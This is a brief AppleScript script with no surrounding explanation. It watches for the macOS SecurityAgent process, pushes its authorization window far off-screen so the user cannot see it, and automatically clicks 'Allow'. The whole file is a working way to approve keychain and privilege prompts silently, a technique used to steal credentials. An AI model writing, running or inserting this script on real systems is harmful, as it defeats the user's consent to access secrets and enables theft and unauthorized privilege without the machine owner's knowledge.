tell application "System Events"
	repeat while exists (processes where name is "SecurityAgent")
		tell process "SecurityAgent"
			try
				set position of window 1 to {100000, 100000}
				
				try
					click button "Allow" of window 1
				end try
			end try
		end tell
	end repeat
end tell
